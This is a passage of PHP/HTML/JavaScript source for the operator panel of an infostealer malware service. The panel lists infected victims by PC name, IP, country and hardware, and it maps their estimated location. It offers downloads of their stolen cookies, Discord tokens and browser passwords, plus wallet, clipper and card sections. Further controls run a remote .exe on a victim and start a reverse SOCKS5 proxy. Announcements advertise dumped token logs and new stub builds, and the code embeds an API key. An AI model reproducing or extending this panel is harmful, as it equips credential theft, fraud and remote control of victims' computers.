                                <i class="fa-solid fa-hammer text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Passwords';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Password</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-key text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Wallets';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Wallets</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-wallet text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Tokens';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Discord</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-brands fa-discord text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Automations';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Automations</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-play text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Clipper';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Clipper</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-clipboard text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Cards';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Cards</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-credit-card text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Settings';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Settings</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-gear text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="window.open('https://<?php echo $domainyess; ?>/Dashboard/Information', '_blank');"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Information</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-circle-info text-stone-400 mt-1 icon"></i>
                            </div>
                        </div>
                    </button>


                </div>
            </div>
        </div>

        <div class="col-span-10 mx-5 mt-10"> <!-- CONTENT -->

            <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-5"> <!-- STATS -->
                <div class="1 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg w-96"><i
                                    class="fa-solid fa-earth-americas text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mytk; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="2 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-globe text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Active Clients</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $myaktv; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <div class="3 bg rounded-lg px-5 py-5 btn">
                    <div class="grid grid-cols-3">
                        <div class="1 col-span-2">
                            <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                    class="fa-solid fa-clipboard text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                Total Cards</h1>
                        </div>
                        <div class="2 text-right">
                            <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                <?php echo $mystole; ?>
                            </h1>
                        </div>
                    </div>
                </div>

                <a href="https://<?php echo $domainyess; ?>/Subscriptions" class="block">
                    <div class="4 bg rounded-lg px-5 py-5 btn cursor-pointer hover:opacity-90 transition">
                        <div class="grid grid-cols-3">
                            <div class="1 col-span-2">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-money-bill text-stone-300 mr-2 bgCol w-11 text-center py-3 rounded-full"></i>
                                    Subscription</h1>
                            </div>
                            <div class="2 text-right">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg py-2 icon">
                                    <?php echo $role; ?>
                                </h1>
                            </div>
                        </div>
                    </div>
                </a>


            </div>

            <div class="grid grid-cols-1 xl:grid-cols-6 gap-5 mt-5"> <!-- ANNOUNCEMENT + LOGS -->
                <div class="1 xl:col-start-1 xl:col-end-5 bg rounded-lg pb-5 btn2">
                    <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                            class="fa-solid fa-bullhorn mr-1 icon2"></i> Announcements</h1>
                    <hr class="mx-5 mt-2 border-stone-800">

                    <div class="message dg mx-5 py-1 mt-5 rounded-lg">
                        <div class="flex px-5 mt-3">
                            <img class="w-12 rounded-full"
                                src="https://cdn.discordapp.com/avatars/1383832332817006683/863686227d1105d4889c5f537cc5af24.png?size=1024"
                                alt="">
                            <div class="grid grid-cols-2">
                                <div class="1 block">
                                    <h1 class="mt-1 ml-2 fntBold text-stone-300 tracking-wide">Hopesar <span
                                            class="text-stone-400 text-sm"> | 04-10-2025</span></h1>
                                    <h3 class="ml-2 text-xs font-thin fntBold tracking-wide text-stone-500">Owner,
                                        Backend Developer,
                                        Stub Developer, Professional Twink Fucker</h3>
                                    </h3>
                                </div>
                            </div>
                        </div>
                        <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                            Free +13k Token logs dumped from a Luckyware knockoff's database (Dump Date Updated!, 5.10.2025), for more information and the data you can visit
                            <a href="https://luckyware.co/FreeLogs"
                                target="_blank"
                                rel="noopener"
                                class="text-stone-400 fntBold underline hover:text-red-500 transition-colors">
                                luckyware.co/FreeLogs
                            </a>
                        </h1>
                    </div>

                    <div class="message dg mx-5 py-1 mt-5 rounded-lg">
                        <div class="flex px-5 mt-3">
                            <img class="w-12 rounded-full"
                                src="https://cdn.discordapp.com/avatars/1383832332817006683/863686227d1105d4889c5f537cc5af24.png?size=1024"
                                alt="">
                            <div class="grid grid-cols-2">
                                <div class="1 block">
                                    <h1 class="mt-1 ml-2 fntBold text-stone-300 tracking-wide">Hopesar <span
                                            class="text-stone-400 text-sm"> | 19-10-2025</span></h1>
                                    <h3 class="ml-2 text-xs font-thin fntBold tracking-wide text-stone-500">Owner,
                                        Backend Developer,
                                        Stub Developer, Professional Twink Fucker</h3>
                                </div>
                            </div>
                        </div>
                        <h1 class="px-5 mt-1 mb-3 text-stone-400 fntBold">
                            Stub version Free 0.2.2 and Premium 0.1.7 Relased, new builds are required. Very soon Free 0.3.0 and Premium 0.2.0 will be out, it will be this years biggest update.</h1>
                    </div>

                </div>

                <div class="2 xl:col-start-5 xl:col-end-7 bg rounded-lg pb-5 btn2">
                    <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400"><i
                            class="fa-solid fa-signal mr-1 icon2"></i> Status</h1>
                    <hr class="mx-5 mt-2 border-stone-800">

                    <div id="websiteStatus" class="dg mx-5 mt-5 rounded-lg py-5 pulse-green">
                        <div class="grid grid-cols-2">
                            <div class="1 px-5">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-laptop mr-1"></i> Website</h1>
                            </div>
                            <div class="2 text-right px-5">
                                <h1 class="text-stone-400 fntBold tracking-wide text-sm mt-1">Working as Intended</h1>
                            </div>
                        </div>
                    </div>

                    <div id="builderStatus" class="dg mx-5 mt-5 rounded-lg py-5 pulse-green">
                        <div class="grid grid-cols-2">
                            <div class="1 px-5">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-hammer mr-1"></i> Builder</h1>
                            </div>
                            <div class="2 text-right px-5">
                                <h1 class="text-stone-400 fntBold tracking-wide text-sm mt-1">Working as Intended</h1>
                            </div>
                        </div>
                    </div>

                    <div id="LogFeatures" class="dg mx-5 mt-5 rounded-lg py-5 pulse-green">
                        <div class="grid grid-cols-2">
                            <div class="1 px-5">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-key mr-1"></i> Loggers</h1>
                            </div>
                            <div class="2 text-right px-5">
                                <h1 class="text-stone-400 fntBold tracking-wide text-sm mt-1">Working as Intended</h1>
                            </div>
                        </div>
                    </div>

                    <div id="InfectorStatus" class="dg mx-5 mt-5 rounded-lg py-5 pulse-green">
                        <div class="grid grid-cols-2">
                            <div class="1 px-5">
                                <h1 class="text-stone-300 fntBold tracking-wide text-lg"><i
                                        class="fa-solid fa-virus-covid mr-1"></i> Infector</h1>
                            </div>
                            <div class="2 text-right px-5">
                                <h1 class="text-stone-400 fntBold tracking-wide text-sm mt-1">Working as Intended</h1>
                            </div>
                        </div>
                    </div>

                    <script>
                        document.getElementById('websiteStatus').style.boxShadow = "0px 0px 2px 0px #038c2a";
                        document.getElementById('builderStatus').style.boxShadow = "0px 0px 2px 0px #038c2a";
                        document.getElementById('LogFeatures').style.boxShadow = "0px 0px 2px 0px #038c2a";
                        document.getElementById('InfectorStatus').style.boxShadow = "0px 0px 2px 0px #038c2a";
                    </script>

                </div>
            </div>

            <div class="rounded-lg mt-5 bg pb-5 btn"> <!-- TABLE -->
                <div class="grid grid-cols-2">
                    <div class="1">




                        <h1 class="fntBold tracking-wide text-lg px-5 pt-4 text-stone-400">
                            <i class="fa-solid fa-book mr-1 icon"></i>
                            <span id="cookiesHeaderText">Connections</span>
                        </h1>
                        <i id="loadingIcon" class="fas fa-spinner fa-spin ml-2" style="display: none;"></i>


                    </div>

                    <style>
                        .entry-search-container {
                            display: flex;
                            align-items: center;
                            /* Vertically center the items */
                        }
                    </style>


                    <div class="2 text-right mx-5 mt-2">

                        <div class="grid grid-cols-1 sm:grid-cols-4 gap-2 sm:gap-5">
                            <div class="0">
                                <h1 style="color: #111111;">s</h1>
                            </div>
                            <div class="1">
                                <select id="entriesSelect" class="text-stone-400 dg px-2 py-2 rounded-lg">
                                    <option value="3">3</option>
                                    <option value="5">5</option>

                                    <option value="10">10</option>
                                    <option value="25">25</option>
                                    <option value="50">50</option>
                                    <option value="75">75</option>
                                    <option value="100">100</option>
                                </select>
                            </div>
                            <div class="2 col-span-2">
                                <div class="sc-container">
                                    <input data-sc="" id="searchInput"
                                        class="smoothCaretInput dg py-2 px-3 rounded-lg text-stone-400"
                                        placeholder="Search Logs" type="text">
                                    <div class="caret" style="width: 2px; height: 60%; background-color: #850000;">
                                    </div>
                                </div>

                            </div>
                        </div>


                        <!-- Entry Number Drop-down (small square) -->




                    </div>
                </div>
                <hr class="mx-5 mt-2 border-stone-800">


                <div class="table-responsive">
                    <table id="DashTable" class="table-fixed w-full mt-5">
                        <thead class="">
                            <tr class="text-center">
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Pc Name </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Ip </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Country </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Hardware </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Windows</h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Status </h1>
                                </th>
                                <th scope="col">
                                    <h1 class="text-stone-400 fntBold text-lg tracking-wide">Options </h1>
                                </th>
                            </tr>
                        </thead>
                        <tbody id="logsContent" class="mt-5">
                            <style>
                                .hover-link {
                                    color: white;
                                    /* Initial color */
                                    transition: color 0.3s ease-in-out;
                                    /* Color transition with animation */
                                }

                                .hover-link:hover {
                                    color: #f54b42;
                                    /* Color on hover */
                                }

                                input::placeholder {
                                    color: #a8a29e;
                                }
                            </style>
                            <script>
                                function deleteRecord(id) {
                                    if (confirm('Are you sure you want to delete this record?')) {
                                        // Create a hidden form and submit it with the ID
                                        var form = document.createElement('form');
                                        form.method = 'post';
                                        form.action = '';
                                        var input = document.createElement('input');
                                        input.type = 'hidden';
                                        input.name = 'id';
                                        input.value = id;
                                        form.appendChild(input);
                                        document.body.appendChild(form);
                                        form.submit();
                                    }
                                }

                                function PurgeOMG(id) {
                                    if (confirm('This will delete ALL Passwords, Tokens, Cookies Of This User And This Log. Are You Sure You Wana Do it? NOTE: This will take some time do not leave the page.')) {
                                        // Create a hidden form and submit it with the ID
                                        var form = document.createElement('form');
                                        form.method = 'post';
                                        form.action = '';
                                        var input = document.createElement('input');
                                        input.type = 'hidden';
                                        input.name = 'purgebig';
                                        input.value = id;
                                        form.appendChild(input);
                                        document.body.appendChild(form);
                                        form.submit();
                                    }
                                }

                                function DownloadCooks(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'ides';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }

                                function DownloadTokns(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'taken';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }

                                function DownloadPasaj(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'Pesord';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }

                                function DownloadPasajed(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'Pesorded';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }


                                function DownloadPasajbr(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'Pesordbr';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }

                                function DownloadPasajal(ides) {

                                    // Create a hidden form and submit it with the ID
                                    var form = document.createElement('form');
                                    form.method = 'post';
                                    form.action = ''; // Add the actual URL for your form submission
                                    var input = document.createElement('input');
                                    input.type = 'hidden';
                                    input.name = 'Pesordal';
                                    input.value = ides;
                                    form.appendChild(input);
                                    document.body.appendChild(form);

                                    // Submit the form
                                    form.submit();
                                }




                                function opensite(url) {
                                    window.open(url);
                                }

                                function copyText(element) {

                                    /* Copy text into clipboard */
                                    navigator.clipboard.writeText(element);
                                }
                            </script>
                        </tbody>
                    </table>
                </div>

                <script>
                    // Function to refresh the DataTable
                    function refreshDataTable() {
                        var table = $('#DashTable').DataTable();
                        table.ajax.reload(null, false); // Reload without resetting page
                    }

                    // Function to initialize the DataTable
                    function initializeDataTable() {
                        // Initialize DataTable with server-side processing
                        var table = $('#DashTable').DataTable({
                            serverSide: true,
                            "lengthMenu": [3, 5, 10, 25, 50, 75, 100],
                            "language": {
                                "search": "Search Data: " // Replace with your custom text
                            },
                            ajax: {
                                url: 'dsh8798r43.php', // Replace with the correct path to your PHP script
                                type: 'POST',
                                beforeSend: function() {
                                    // Show the header text with a loading animation
                                    $('#cookiesHeaderText').html(' Connections  <i class="fas fa-spinner fa-spin"></i>');
                                },
                                complete: function() {
                                    // Restore the header text to "Cookies" after the data is loaded
                                    $('#cookiesHeaderText').html(' Connections');
                                }
                            },
                            columns: [{
                                    data: 0
                                },
                                {
                                    data: 1
                                },
                                {
                                    data: 2
                                },
                                {
                                    data: 3
                                },
                                {
                                    data: 4
                                },
                                {
                                    data: 5
                                },
                                {
                                    data: 6
                                }
                            ],
                            paging: true,
                            ordering: true,
                            dom: 'lrtip' // This specifies the DataTables elements to display
                        });

                        // Add an event listener to your custom search input
                        $('#searchInput').on('keyup', function() {
                            // Get the input value
                            var inputValue = $(this).val();

                            // Use DataTables' search() method to filter the table
                            table.search(inputValue).draw();
                        });

                        // Add an event listener to the entry number drop-down
                        $('#entriesSelect').on('change', function() {
                            // Get the selected value
                            var selectedValue = $(this).val();

                            // Change the number of entries displayed per page
                            table.page.len(selectedValue).draw();
                        });

                        // Hide the default DataTables length dropdown
                        $('div.dataTables_length').css('display', 'none');

                        // Optionally, you can remove the label as well
                        $('label[for="DashTable_length"]').css('display', 'none');
                    }

                    // Call the initializeDataTable function on page load
                    $(document).ready(function() {
                        initializeDataTable();

                        // Refresh the DataTable every 1 minute (60000 milliseconds)
                        setInterval(refreshDataTable, 60000);
                    });
                </script>
            </div>


            <!-- Modal -->
            <div scroll="no" style="overflow: hidden" id="infoModalOpen" class="infoModalOpen bg">
                <div class="infoModalOpen-content bg top-flying btn2">
                    <div class="grid xl:grid-cols-2">
                        <div class="1">
                            <h1 class="text-stone-300 fntPoppins mt-2"><i class="fa-solid fa-book mr-1 icon"></i> Log
                                Details</h1>
                        </div>
                        <div class="2 text-right">
                            <button class="" onclick="infoModalClose()"><i
                                    class="fa-solid fa-circle textCol icon2"></i></button>
                        </div>
                    </div>
                    <hr class="border-stone-800 mt-3">
                    <div id="infoModalConent" class="bg pt-2 pb-5 rounded-lg">

                    </div>
                </div>
            </div>

            <script>
                function infoModalOpen(botId) {
                    var modal = document.getElementById("infoModalOpen");
                    var modalContent = document.getElementById("infoModalConent");

                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", "fetch_bot_data.php?botId=" + botId, true);

                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            var data = JSON.parse(xhr.responseText);
                            var lastPingTimestamp = data.LastPing;
                            var lastPingDate = new Date(lastPingTimestamp * 1000);

                            var FirstPingTimestamp = data.InstallDate;
                            var FirstPingDate = new Date(FirstPingTimestamp * 1000);

                            var dateOptions = {
                                year: 'numeric',
                                month: 'long',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit',
                                timeZoneName: 'short'
                            };
                            var lastPingString = lastPingDate.toLocaleDateString('en-US', dateOptions);
                            var FirstPingString = FirstPingDate.toLocaleDateString('en-US', dateOptions);

                            var lat = data.lat;
                            var lon = data.lon;
                            var apiKey = 'AIzaSyBJMWmFR7XNFvjI7wE9r44df7iW3BPSiHQ';
                            var embedUrl = "https://www.google.com/maps/embed/v1/place?key=" + apiKey + "&q=" + lat + "," + lon;
                            var accuracy = data.accuracy;
                            var accuracyInfo = (accuracy < 100)

                            modalContent.innerHTML = `

            <hr class="brdBg pb-3 mt-3">

<div class="grid xl:grid-cols-1">
    <div class="1 text-sm text-left">
        <h1 class="text-stone-300 fntPoppins tracking-wider">Log ID <span class="text-stone-400 fntBold tracking-wider w-full ml-auto"> ${botId}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Build ID <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.BuildID}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">CPU <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.CPU}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Discord Accounts <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.DiscordAccounts}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Firt Connection <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${FirstPingString}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Last Ping <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${lastPingString}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Estimated Address <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.Addres}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Log HWID <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.HWID}</span></h1>
        <h1 class="text-stone-300 fntPoppins tracking-wider mt-3">Accuracy Of Address Can Be <span class="text-stone-400 fntBold tracking-wider mt-3 w-full ml-auto"> ${data.accuracy} Meters More or Less</span></h1>
    </div>
</div>

                <!-- Google Maps iframe -->
                <style>
                    .map-container {
                        margin-top: 10px;
                    }
                </style>
                <div class="map-container" style="width: 100%; height: 300px;">
                    <iframe src="${embedUrl}" width="100%" height="100%" frameborder="0" style="border:0;" allowfullscreen="" aria-hidden="false" tabindex="0"></iframe>
                </div>
            `;

                            modal.style.display = "block";
                        } else {
                            console.error("Error fetching data");
                        }
                    };

                    xhr.send();
                }

                function infoModalClose() {
                    var modal = document.getElementById("infoModalOpen");
                    modal.style.display = "none";
                }

                // Function to fetch bot data using AJAX
                function infoModalfetchBotData(botId) {
                    return new Promise(function(resolve, reject) {
                        // Make an AJAX request to fetch the data based on botId
                        var xhr = new XMLHttpRequest();
                        xhr.open("GET", "fetch_bot_data.php?botId=" + botId, true);
                        xhr.onreadystatechange = function() {
                            if (xhr.readyState === 4) {
                                if (xhr.status === 200) {
                                    // Parse the JSON response
                                    var data = JSON.parse(xhr.responseText);
                                    resolve(data);
                                } else {
                                    reject("Error fetching data");
                                }
                            }
                        };
                        xhr.send();
                    });
                }
            </script>


            <style>
                .infoModalOpen {
                    display: none;
                    position: fixed;
                    z-index: 1;
                    margin-top: -6rem;
                    border: var(--background);
                    left: 0;
                    top: 00;
                    width: 100%;
                    height: 100%;
                    overflow: auto;
                    background-color: rgba(0, 0, 0, 0.0);
                }

                .infoModalOpen-content {
                    top: 0;
                    margin: 10% auto;
                    padding: 20px;
                    width: 80%;
                    max-width: 600px;
                    /* Add these lines */
                    margin: 5% auto;
                    width: 95%;
                    max-height: 90vh;
                    overflow-y: auto;
                    padding: 10px;
                }

                @media (max-width: 640px) {

                    .modal-content,
                    .infoModalOpen-content {
                        margin: 2% auto;
                        width: 98%;
                        padding: 15px;
                    }
                }

                .close {
                    color: #aaaaaa;
                    float: right;
                    font-size: 28px;
                    font-weight: bold;
                    cursor: pointer;
                }
            </style>



            <div scroll="no" style="overflow: hidden" id="myModal" class="modal bg">
                <div class="modal-content bg top-flying btn2">
                    <div class="grid xl:grid-cols-2 mx-5 pt-3">
                        <div class="1">
                            <h1 class="text-stone-300 fntPoppins mt-2"><i class="fa-solid fa-book mr-1 icon"></i> Log
                                Actions</h1>
                        </div>
                        <div class="2 text-right">
                            <button class="" onclick="closeModal()"><i
                                    class="fa-solid fa-circle textCol icon2"></i></button>
                        </div>
                    </div>
                    <hr class="border-stone-800 mt-3 mx-5">
                    <div id="modalContent" class="bg rounded-lg mx-5 py-3">

                    </div>
                </div>
            </div>

            <script>
                function openActions(botIdaq) {
                    var modal = document.getElementById("myModal");
                    var modalContent = document.getElementById("modalContent");

                    var xhr = new XMLHttpRequest();
                    xhr.open("GET", "fetch_bot_data.php?botId=" + botIdaq, true);

                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            var data = JSON.parse(xhr.responseText);
                            var lastPingTimestamp = data.LastPing;
                            var lastPingDate = new Date(lastPingTimestamp * 1000);
                            var dateOptions = {
                                year: 'numeric',
                                month: 'long',
                                day: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit',
                                timeZoneName: 'short'
                            };
                            var lastPingString = lastPingDate.toLocaleDateString('en-US', dateOptions);
                            var lat = data.lat;
                            var lon = data.lon;
                            var apiKey = 'AIzaSyBJMWmFR7XNFvjI7wE9r44df7iW3BPSiHQ';
                            var embedUrl = "https://www.google.com/maps/embed/v1/place?key=" + apiKey + "&q=" + lat + "," + lon;
                            var accuracy = data.accuracy;
                            var accuracyInfo = (accuracy < 100)

                            modalContent.innerHTML = `
    <hr class="brdBg pb-0 mt-3">

    <div class="flex">
        <button onclick="info()" class="text-stone-400 dg w-full py-3 fntBold tracking-wide hvr-underline-from-center btn rounded-lg text-lg"><i class="fa-solid fa-bars icon mr-1"></i> Info</button>
        <button onclick="actions()" class="text-stone-400 dg w-full py-3 ml-3 fntBold tracking-wide hvr-underline-from-center btn rounded-lg text-lg "><i class="fa-solid fa-gear icon mr-1"></i> Actions</button>
    </div>

    <div class="grid xl:grid-cols-1 mt-3">
        <div id="info" class="1">
        <hr class="mt-5 mb-5 border-stone-800">
            <button id="DownloadButton" onclick="DownloadCooks(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-solid fa-cookie icon"></i> <?php echo $cokerdata; ?> (Takes a bit)</button>
            <button id="TokeBtn" onclick="DownloadTokns(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-brands fa-discord icon"></i> Download Tokens</button>
            <button id="PassBtnch" onclick="DownloadPasaj(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-brands fa-chrome"></i> Download Chrome Passwords</button>
            <button id="PassBtned" onclick="DownloadPasajed(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-brands fa-edge-legacy"></i> Download Edge Passwords</button>
            <button id="PassBtnbr" onclick="DownloadPasajbr(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-brands fa-brave"></i> Download Brave Passwords</button>
            <button id="PassBtnal" onclick="DownloadPasajal(${botIdaq})" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mb-2"><i class="fa-solid fa-lock icon"></i> Download All Passwords</button>

            </div>
        <div id="actions" class="2">
        <hr class="mt-5 mb-5 border-stone-800">
            <h1 class="text-stone-300 fntBold tracking-wode text-lg">File Execution</h1>
            <form method="post">
            <div class="sc-container">
                <input id="filurl" data-sc="" type="text" name="filurl" class="smoothCaretInput dg py-2 px-3 rounded-lg text-stone-400" placeholder="Paste File URL! (Only Discord Attachments And .Exe Files Accepted)">
                <div class="caret" style="width: 2px; height: 60%; background-color: #e61b0a;"></div>
            </div>
            <input type="hidden" id="botIdaq" name="botIdaq" value="${botIdaq}">
            <button id="execsend" type="submit" name="execsend" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mt-2"><i class="fa-solid fa-play icon"></i> Submit</button>
            </form>
            <hr class="mt-5 mb-5 border-stone-800">
           <h1 class="text-stone-300 fntBold tracking-wode text-lg relative">
    Reverse SOCKS5 | Tutorial [Soon]
</h1>
<form method="post">
    <div class="sc-container">
        <input id="proxpot" data-sc="" type="text" name="proxpot" class="smoothCaretInput dg py-2 px-3 rounded-lg text-stone-400" placeholder="Please enter server details like Ip:Port">
        <div class="caret" style="width: 2px; height: 60%; background-color: #e61b0a;"></div>
    </div>
    <input type="hidden" id="botIdaq" name="botIdaq" value="${botIdaq}">
    <button id="proxsend" type="submit" name="proxsend" class="text-stone-300 dg w-full py-2 fntBold tracking-wide btn rounded-lg mt-2"><i class="fa-solid fa-circle-play icon"></i> Start Reverse Proxy</button>
</form>
<hr class="mt-5 mb-5 border-stone-800">
            <button onclick="PurgeOMG(${botIdaq})" class="text-stone-300 bgCol w-full py-2 fntBold tracking-wide btn rounded-lg"><i class="fa-solid fa-trash-can icon"></i> Purge</button>
        </div>
    </div>
`;

                            modal.style.display = "block";
                            document.getElementById('info').style.display = 'none';
                            document.getElementById('actions').style.display = 'none';
                        } else {
                            console.error("Error fetching data");
                        }
                    };

                    xhr.send();
                }

                function closeModal() {
                    var modal = document.getElementById("myModal");
